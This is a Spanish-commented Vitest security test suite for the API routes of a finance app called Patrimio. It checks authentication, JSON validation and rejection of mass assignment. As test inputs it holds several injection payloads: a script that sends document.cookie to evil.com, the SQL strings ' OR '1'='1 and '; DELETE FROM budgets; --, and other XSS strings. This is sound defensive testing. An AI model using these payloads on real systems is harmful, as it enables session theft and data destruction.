/**
 * tests/unit/security/api-routes.test.ts
 *
 * Tests de seguridad para los API routes de Patrimio.
 * Los handlers de Next.js se importan y ejecutan directamente con mocks de Supabase.
 *
 * Patrones cubiertos:
 *   - 401 cuando no hay sesión autenticada (TODOS los endpoints)
 *   - 400 con JSON malformado
 *   - 400 con campos de Zod inválidos (incluyendo inyección SQL y XSS)
 *   - Mass assignment: user_id / deleted_at / id en el body → rechazado por .strict()
 *   - user_id NUNCA se acepta del body — siempre del JWT
 *   - DB mock retorna 500 correcto sin filtrar información sensible
 *
 * Se mockean:
 *   - @/lib/supabase/server → createClient() simulado
 *   - mutaciones de cada dominio → evitar conexión real a Supabase
 */
import { describe, expect, it, vi, beforeEach } from "vitest";
import { NextRequest } from "next/server";

// ─── Helpers ─────────────────────────────────────────────────────────────────

function makeRequest(
  url: string,
  method: "GET" | "POST" | "PATCH" | "DELETE",
  body?: unknown,
): NextRequest {
  return new NextRequest(`http://localhost${url}`, {
    method,
    headers: { "content-type": "application/json" },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
}

const ANON_SUPABASE = {
  auth: {
    getUser: vi.fn().mockResolvedValue({ data: { user: null }, error: new Error("Unauthorized") }),
  },
  from: vi.fn().mockReturnThis(),
  select: vi.fn().mockReturnThis(),
  eq: vi.fn().mockReturnThis(),
  is: vi.fn().mockReturnThis(),
  single: vi.fn().mockResolvedValue({ data: null, error: null }),
  insert: vi.fn().mockReturnThis(),
  update: vi.fn().mockReturnThis(),
  rpc: vi.fn().mockResolvedValue({ data: null, error: null }),
};

const AUTH_SUPABASE = {
  auth: {
    getUser: vi.fn().mockResolvedValue({
      data: { user: { id: "uid-test-123", email: "test@example.com" } },
      error: null,
    }),
  },
  from: vi.fn().mockReturnThis(),
  select: vi.fn().mockReturnThis(),
  eq: vi.fn().mockReturnThis(),
  is: vi.fn().mockReturnThis(),
  single: vi.fn().mockResolvedValue({
    data: { id: "uid-test-123" },
    error: null,
  }),
  insert: vi.fn().mockReturnThis(),
  update: vi.fn().mockReturnThis(),
  order: vi.fn().mockReturnThis(),
  rpc: vi.fn().mockResolvedValue({ data: null, error: null }),
};

let currentSupabaseMock = ANON_SUPABASE;

vi.mock("@/lib/supabase/server", () => ({
  createClient: vi.fn(() => currentSupabaseMock),
}));

vi.mock("@/lib/budgets/mutations", () => ({
  createBudget: vi.fn().mockResolvedValue({ id: "budget-1" }),
  updateBudget: vi.fn().mockResolvedValue({ id: "budget-1" }),
}));

vi.mock("@/lib/budgets/server", () => ({
  getBudgetsOverview: vi.fn().mockResolvedValue({ budgets: [], summary: {} }),
}));

vi.mock("@/lib/alerts/mutations", () => ({
  createCustomAlert: vi.fn().mockResolvedValue("alert-id-1"),
  updateCustomAlert: vi.fn().mockResolvedValue(undefined),
}));

vi.mock("@/lib/alerts/server", () => ({
  getCustomAlertsPageData: vi.fn().mockResolvedValue({ alerts: [], summary: {} }),
}));

vi.mock("@/lib/commitments/mutations", () => ({
  createCommitment: vi.fn().mockResolvedValue({ id: "commitment-1" }),
}));

vi.mock("@/lib/commitments/server", () => ({
  getCommitmentsOverview: vi.fn().mockResolvedValue({ commitments: [], summary: {} }),
}));

vi.mock("@/lib/investments/mutations", () => ({
  createInvestmentPosition: vi.fn().mockResolvedValue({ id: "inv-1" }),
}));

vi.mock("@/lib/investments/server", () => ({
  getInvestmentsOverview: vi.fn().mockResolvedValue({ positions: [], summary: {} }),
}));

vi.mock("next-intl/server", () => ({
  getTranslations: vi.fn().mockResolvedValue((key: string) => key),
}));

// ─── /api/transactions ────────────────────────────────────────────────────────

describe("POST /api/transactions — autenticación", () => {
  beforeEach(() => {
    currentSupabaseMock = ANON_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin sesión activa", async () => {
    const { POST } = await import("@/app/api/transactions/route");
    const req = makeRequest("/api/transactions", "POST", {
      account_id: "00000000-0000-4000-8000-000000000001",
      amount_cents: 100,
      description: "Test",
      is_income: false,
    });
    const res = await POST(req);
    expect(res.status).toBe(401);
  });
});

describe("POST /api/transactions — validación de entrada", () => {
  beforeEach(() => {
    currentSupabaseMock = {
      ...AUTH_SUPABASE,
      from: vi.fn().mockReturnValue({
        select: vi.fn().mockReturnValue({
          eq: vi.fn().mockReturnValue({
            eq: vi.fn().mockReturnValue({
              is: vi.fn().mockReturnValue({
                single: vi.fn().mockResolvedValue({
                  data: { id: "00000000-0000-4000-8000-000000000001" },
                  error: null,
                }),
              }),
            }),
          }),
        }),
        insert: vi.fn().mockReturnValue({
          select: vi.fn().mockReturnValue({
            single: vi.fn().mockResolvedValue({
              data: { id: "tx-1" },
              error: null,
            }),
          }),
        }),
      }),
    };
    vi.clearAllMocks();
  });

  it("retorna 400 con JSON malformado", async () => {
    const { POST } = await import("@/app/api/transactions/route");
    const req = new NextRequest("http://localhost/api/transactions", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "{ invalid json",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.error).toBeDefined();
  });

  it("retorna 400 cuando amount_cents = 0", async () => {
    const { POST } = await import("@/app/api/transactions/route");
    const req = makeRequest("/api/transactions", "POST", {
      account_id: "00000000-0000-4000-8000-000000000001",
      amount_cents: 0,
      description: "Test",
      is_income: false,
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 cuando description contiene XSS", async () => {
    const { POST } = await import("@/app/api/transactions/route");
    const req = makeRequest("/api/transactions", "POST", {
      account_id: "00000000-0000-4000-8000-000000000001",
      amount_cents: 100,
      description: '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>',
      is_income: false,
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 cuando user_id inyectado en body (.strict())", async () => {
    const { POST } = await import("@/app/api/transactions/route");
    const req = makeRequest("/api/transactions", "POST", {
      account_id: "00000000-0000-4000-8000-000000000001",
      amount_cents: 100,
      description: "Test",
      is_income: false,
      user_id: "hacker-uid-999",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 cuando account_id no es UUID válido", async () => {
    const { POST } = await import("@/app/api/transactions/route");
    const req = makeRequest("/api/transactions", "POST", {
      account_id: "' OR '1'='1",
      amount_cents: 100,
      description: "Test",
      is_income: false,
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 cuando amount_cents es float", async () => {
    const { POST } = await import("@/app/api/transactions/route");
    const req = makeRequest("/api/transactions", "POST", {
      account_id: "00000000-0000-4000-8000-000000000001",
      amount_cents: 100.5,
      description: "Test",
      is_income: false,
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });
});

// ─── /api/budgets ────────────────────────────────────────────────────────────

describe("GET /api/budgets — autenticación", () => {
  beforeEach(() => {
    currentSupabaseMock = ANON_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin sesión activa", async () => {
    const { GET } = await import("@/app/api/budgets/route");
    const res = await GET();
    expect(res.status).toBe(401);
  });
});

describe("POST /api/budgets — validación de entrada", () => {
  beforeEach(() => {
    currentSupabaseMock = AUTH_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin autenticación", async () => {
    currentSupabaseMock = ANON_SUPABASE;
    const { POST } = await import("@/app/api/budgets/route");
    const req = makeRequest("/api/budgets", "POST", {
      category_id: "00000000-0000-4000-8000-000000000001",
      period: "monthly",
      limit_input: "500",
      start_date: "2026-01-01",
    });
    const res = await POST(req);
    expect(res.status).toBe(401);
  });

  it("retorna 400 con body malformado", async () => {
    const { POST } = await import("@/app/api/budgets/route");
    const req = new NextRequest("http://localhost/api/budgets", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "{bad json",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 cuando user_id inyectado en body", async () => {
    const { POST } = await import("@/app/api/budgets/route");
    const req = makeRequest("/api/budgets", "POST", {
      category_id: "00000000-0000-4000-8000-000000000001",
      period: "monthly",
      limit_input: "500",
      start_date: "2026-01-01",
      user_id: "hacker-uid-999",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 con category_id no UUID", async () => {
    const { POST } = await import("@/app/api/budgets/route");
    const req = makeRequest("/api/budgets", "POST", {
      category_id: "'; DELETE FROM budgets; --",
      period: "monthly",
      limit_input: "500",
      start_date: "2026-01-01",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });
});

// ─── /api/custom-alerts ───────────────────────────────────────────────────────

describe("GET /api/custom-alerts — autenticación", () => {
  beforeEach(() => {
    currentSupabaseMock = ANON_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin sesión activa", async () => {
    const { GET } = await import("@/app/api/custom-alerts/route");
    const res = await GET();
    expect(res.status).toBe(401);
  });
});

describe("POST /api/custom-alerts — validación de entrada", () => {
  beforeEach(() => {
    currentSupabaseMock = AUTH_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin autenticación", async () => {
    currentSupabaseMock = ANON_SUPABASE;
    const { POST } = await import("@/app/api/custom-alerts/route");
    const req = makeRequest("/api/custom-alerts", "POST", {
      name: "IBI",
      due_date: "2026-01-01",
      recurrence: "annual",
    });
    const res = await POST(req);
    expect(res.status).toBe(401);
  });

  it("retorna 400 con XSS en name", async () => {
    const { POST } = await import("@/app/api/custom-alerts/route");
    const req = makeRequest("/api/custom-alerts", "POST", {
      name: '<script>alert("xss")</script>',
      due_date: "2026-01-01",
      recurrence: "annual",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 con recurrence inválida 'weekly'", async () => {
    const { POST } = await import("@/app/api/custom-alerts/route");
    const req = makeRequest("/api/custom-alerts", "POST", {
      name: "IBI",
      due_date: "2026-01-01",
      recurrence: "weekly",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 cuando user_id inyectado en body", async () => {
    const { POST } = await import("@/app/api/custom-alerts/route");
    const req = makeRequest("/api/custom-alerts", "POST", {
      name: "IBI",
      due_date: "2026-01-01",
      recurrence: "annual",
      user_id: "hacker-uid-999",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });
});

// ─── /api/commitments ────────────────────────────────────────────────────────

describe("GET /api/commitments — autenticación", () => {
  beforeEach(() => {
    currentSupabaseMock = ANON_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin sesión activa", async () => {
    const { GET } = await import("@/app/api/commitments/route");
    const res = await GET();
    expect(res.status).toBe(401);
  });
});

describe("POST /api/commitments — validación de entrada", () => {
  beforeEach(() => {
    currentSupabaseMock = AUTH_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin autenticación", async () => {
    currentSupabaseMock = ANON_SUPABASE;
    const { POST } = await import("@/app/api/commitments/route");
    const req = makeRequest("/api/commitments", "POST", { name: "Hipoteca" });
    const res = await POST(req);
    expect(res.status).toBe(401);
  });

  it("retorna 400 con JSON malformado", async () => {
    const { POST } = await import("@/app/api/commitments/route");
    const req = new NextRequest("http://localhost/api/commitments", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "not json at all",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 con user_id inyectado en body", async () => {
    const { POST } = await import("@/app/api/commitments/route");
    const req = makeRequest("/api/commitments", "POST", {
      name: "Hipoteca",
      commitment_type: "mortgage",
      account_id: "00000000-0000-4000-8000-000000000001",
      amount_input: "1000",
      start_date: "2026-01-01",
      user_id: "hacker-uid-999",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });
});

// ─── /api/investments ────────────────────────────────────────────────────────

describe("GET /api/investments — autenticación", () => {
  beforeEach(() => {
    currentSupabaseMock = ANON_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin sesión activa", async () => {
    const { GET } = await import("@/app/api/investments/route");
    const req = makeRequest("/api/investments", "GET");
    const res = await GET(req);
    expect(res.status).toBe(401);
  });
});

describe("POST /api/investments — validación de entrada", () => {
  beforeEach(() => {
    currentSupabaseMock = AUTH_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin autenticación", async () => {
    currentSupabaseMock = ANON_SUPABASE;
    const { POST } = await import("@/app/api/investments/route");
    const req = makeRequest("/api/investments", "POST", { name: "Iberdrola" });
    const res = await POST(req);
    expect(res.status).toBe(401);
  });

  it("retorna 400 con user_id inyectado en body", async () => {
    const { POST } = await import("@/app/api/investments/route");
    const req = makeRequest("/api/investments", "POST", {
      investment_type: "stock",
      name: "Iberdrola",
      opening_date: "2026-01-01",
      opening_price_input: "10,50",
      opening_quantity_input: "100",
      ticker: "IBE",
      user_id: "hacker-uid-999",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 con XSS en ticker", async () => {
    const { POST } = await import("@/app/api/investments/route");
    const req = makeRequest("/api/investments", "POST", {
      investment_type: "stock",
      name: "Iberdrola",
      opening_date: "2026-01-01",
      opening_price_input: "10,50",
      opening_quantity_input: "100",
      ticker: "<script>alert(1)</script>",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });
});

// ─── /api/privacy/export ─────────────────────────────────────────────────────

describe("GET /api/privacy/export — autenticación", () => {
  beforeEach(() => {
    currentSupabaseMock = ANON_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin sesión activa (no permite exportar datos de otro usuario)", async () => {
    const { GET } = await import("@/app/api/privacy/export/route");
    const res = await GET();
    expect(res.status).toBe(401);
  });
});

// ─── /api/accounts ───────────────────────────────────────────────────────────

describe("GET /api/accounts — autenticación", () => {
  beforeEach(() => {
    currentSupabaseMock = ANON_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin sesión activa", async () => {
    const { GET } = await import("@/app/api/accounts/route");
    const res = await GET();
    expect(res.status).toBe(401);
  });
});

describe("POST /api/accounts — validación y seguridad", () => {
  beforeEach(() => {
    currentSupabaseMock = {
      ...AUTH_SUPABASE,
      from: vi.fn().mockReturnValue({
        select: vi.fn().mockReturnValue({
          eq: vi.fn().mockReturnValue({
            is: vi.fn().mockReturnValue({
              order: vi.fn().mockResolvedValue({ data: [], error: null }),
            }),
          }),
        }),
        insert: vi.fn().mockReturnValue({
          select: vi.fn().mockReturnValue({
            single: vi.fn().mockResolvedValue({
              data: { id: "acc-1", name: "Test" },
              error: null,
            }),
          }),
        }),
      }),
    };
    vi.clearAllMocks();
  });

  it("retorna 401 sin autenticación", async () => {
    currentSupabaseMock = ANON_SUPABASE;
    const { POST } = await import("@/app/api/accounts/route");
    const req = new Request("http://localhost/api/accounts", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ name: "Mi cuenta", account_type: "savings", currency: "EUR" }),
    });
    const res = await POST(req);
    expect(res.status).toBe(401);
  });

  it("retorna 400 con user_id inyectado en body (.strict())", async () => {
    const { POST } = await import("@/app/api/accounts/route");
    const req = new Request("http://localhost/api/accounts", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        name: "Mi cuenta",
        account_type: "savings",
        currency: "EUR",
        user_id: "hacker-uid-999",
      }),
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 con color hexadecimal inválido", async () => {
    const { POST } = await import("@/app/api/accounts/route");
    const req = new Request("http://localhost/api/accounts", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        name: "Mi cuenta",
        account_type: "savings",
        currency: "EUR",
        color: "expression(alert(1))",
      }),
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 con initial_balance_cents float", async () => {
    const { POST } = await import("@/app/api/accounts/route");
    const req = new Request("http://localhost/api/accounts", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        name: "Mi cuenta",
        account_type: "savings",
        currency: "EUR",
        initial_balance_cents: 100.5,
      }),
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("retorna 400 con XSS en bank_name", async () => {
    const { POST } = await import("@/app/api/accounts/route");
    const req = new Request("http://localhost/api/accounts", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        name: "Mi cuenta",
        account_type: "savings",
        currency: "EUR",
        bank_name: "<script>document.cookie</script>",
      }),
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });
});

// ─── /api/auth/sessions ───────────────────────────────────────────────────────

describe("GET /api/auth/sessions — autenticación", () => {
  beforeEach(() => {
    currentSupabaseMock = ANON_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 sin sesión activa", async () => {
    const { GET } = await import("@/app/api/auth/sessions/route");
    const req = new NextRequest("http://localhost/api/auth/sessions", { method: "GET" });
    const res = await GET(req);
    expect(res.status).toBe(401);
  });
});

describe("DELETE /api/auth/sessions — autenticación", () => {
  beforeEach(() => {
    currentSupabaseMock = ANON_SUPABASE;
    vi.clearAllMocks();
  });

  it("retorna 401 al intentar invalidar sesiones sin estar autenticado", async () => {
    const { DELETE } = await import("@/app/api/auth/sessions/route");
    const req = new NextRequest("http://localhost/api/auth/sessions", { method: "DELETE" });
    const res = await DELETE(req);
    expect(res.status).toBe(401);
  });
});
